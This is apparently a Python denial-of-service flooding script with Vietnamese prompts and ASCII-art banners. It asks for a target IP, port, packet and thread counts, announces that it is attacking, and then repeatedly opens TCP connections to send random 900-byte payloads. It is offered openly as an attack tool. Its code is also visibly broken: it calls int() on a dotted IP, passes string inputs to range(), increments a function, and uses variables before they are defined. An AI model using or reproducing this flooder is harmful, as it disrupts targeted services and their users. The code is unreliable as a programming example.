from concurrent.futures import thread
import random
import threading
import socket
import os
import time
from termcolor import colored

os.system("cls") # xóa toàn bộ sau khi chạy

print(colored("""

                                DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
                                DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
                                DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
                                DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
                                DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
                                DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDPPPPPDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
                                DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDJ7!!7JYDPPPDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
                                DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDPPPDDY?~::^!?YPPDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
                                DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDPPPPDDDJYPPPPPY7::::~JDPDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
                                DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDPDJ!~~~^^::!JDDDPPY!::::^?DPDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
                                DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDPPD?^:::::::::~JDDDDDPP?:::::~YPDDDDDDDDDDDDDDDDDDDDDDDDDDDD
                                DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDPPD7^::::::::^7YPPDDDDDDDPJ:::::^YPDDDDDDDDDDDDDDDDDDDDDDDDDDD
                                DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDPY7^::::::::::!DPPDDDDDDDDDP7:::::^DPDDDDDDDDDDDDDDDDDDDDDDDDDD
                                DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD!::::::::::::::^!YPPDDDDDDDPD^:::::7PDDDDDDDDDDDDDDDDDDDDDDDDDD
                                DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDJ!::::::~~::::::::!YPPDDDDDDP~:::::^DDDDDDDDDDDDDDDDDDDDDDDDDDD
                                DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDPPY!::~JDDJ!::::::::~JDPDDDDP~::::::YPDDDDDDDDDDDDDDDDDDDDDDDDD
                                DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDPPYJDPDDPPY!::::::::~JDPDPD^:::::^DDDDDDDDDDDDDDDDDDDDDDDDDDD
                                DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDPPDDDPPDDDDDDPPY7^:::::::^?DP7::::::7PDDDDDDDDDDDDDDDDDDDDDDDDDD
                                DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDPPYYPPPDDDDDDDDDDPPD7^:::::::^!::::::^DDDDDDDDDDDDDDDDDDDDDDDDDDDD
                                DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDPPD?~::~?DPPPPDDDDDDDDPPD?~::::::::::::^YPDDDDDDDDDDDDDDDDDDDDDDDDDDD
                                DDDDDDDDDDDDDDDDDDDDDDDDDDDDDPDY7^::::::^~7JDDPPPPPPPPPPPD?^:::::::::^YPDDDDDDDDDDDDDDDDDDDDDDDDDDDD
                                DDDDDDDDDDDDDDDDDDDDDDDDDDDPD?~::::::^::::::^~!77??JJJ?7!~^:::::::::::!JDDDDDDDDDDDDDDDDDDDDDDDDDDDD
                                DDDDDDDDDDDDDDDDDDDDDDDDDDD?^:::::^7YDJ!^:::::::::::::::::::::::::::::::?DDDDDDDDDDDDDDDDDDDDDDDDDDD
                                DDDDDDDDDDDDDDDDDDDDDDDDDDDY!:::~?DPPDPPDJ7~^::::::::::::::::^!?J7^:::!JDDDDDDDDDDDDDDDDDDDDDDDDDDDD
                                DDDDDDDDDDDDDDDDDDDDDDDDDDDPPY7YDPDDDDDDDPPDDJ?7!!~~~~~!!7?JYDPPPPD7!YPPDDDDDDDDDDDDDDDDDDDDDDDDDDDD
                                DDDDDDDDDDDDDDDDDDDDDDDDDDDDDPPPDDDDDDDDDDDDPPPPPPPDDDPPPPPPPDDDDDPPPPDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
                                DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
                                DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
                                DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
                                DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
                                DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD

            created by: vudc006. Thank for using my software.
""","red"))

ip = input(colored("Nhập IP vào đây, nhanh lên: ", "green"))
port = input(colored("Port đâu!!: ", "green"))
packet = input(colored("Packet nữa: ", "green"))
thread = input(colored("Thế còn Thread đâu: ", "green"))
time.sleep(1.5)

ip = int(ip)
port = int(port)


print(colored("""
                                ỜM ĐANG TẤN CÔNG ĐÂY ĐỢI TÝ

          .^^:.               ....          ...  :^^:.            .....             :^.           
            55YYJJ!  .::^~~!!7??JJY!:^^~!!7???JY? ^GYYYJJ^       :!?JJJJJ?!?J?????J7^J5YJ^          
           JPJJJJJY7 7GJJYYYJJJJJJYBYJJYYYJJJJJYJ.PYJJJJJY^    .?YYJJJJJJJYP5JJJJJY5YYJJJY?.        
          !G?JJ??JJY7:BYYYJJJJJJY?7PPJYJJJJJJJJ7~55?JJJJJJY^  .55JJJJJJJ?J755?JJJJJJJ?JJJ?!.        
         ^G????YJ???J7^^!B???????  .~^GJ?????Y: ?P????5????J^ ?P????J??YYY:5Y?????????J?^.          
        .PJ????GP7???J7 ^B??????7     GJ7????J !P???7JBJ7???J^PY7???J!^~J? 5Y7???????7??^           
        5Y777777?77777?!^B77777?~     PJ777777^G?77777?777777?PP777777?77J:5J77777777777?7^         
       JY!!77777J?!!777?YB7!!!!?:     G?!!!!7?P?!!!7!7?J7!7!77JGP?!!7!!!!7!5J!!!!!7PY7!!!77?:       
      .JYJ?7!77:~GJ!77!^^J?JJ???.     7JJJJ??7YYJ?!!7!:?G7777!^.~YY??77777!5Y777777~7PJ!!77^.       
        .^!J?!.  ^J~:.     .:^~:        .:^~^  .~7J7^   7?^:.     :~~~~^:. ^^::...   :?Y!^.         
            .                                                                          .                   
                                             """,'blue'))
print(colored("\n##############################################################################################",'green'))
time.sleep(2)
print(colored("\n[+] Start......", 'green'))
time.sleep(1)
print(colored("\n3", 'green'))
time.sleep(1)                                                                              
print(colored("\n2", 'green'))
time.sleep(1)
print(colored("\n1", 'green'))
time.sleep(1)
os.system('cls')

def syn():
  global hevin
  hevin = random._urandom(900)
  
while True:
  try:
    h = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    h.connect((ip,port))
    h.send(hevin)
    for i in range(packet):
      h.send(hevin)
      def bb():
        h.send(hevin)
      bb += 1
      print(colored('[+] Tấn công '+ip +'Gửi'+str(bb),'red'))
  except KeyboardInterrupt:
      h.close()
      print(colored("[+++] Xong rồi!!!", 'green'))
      pass

  for b in range(thread):
    thread = threading.Thread(target=syn)
    thread.start()    
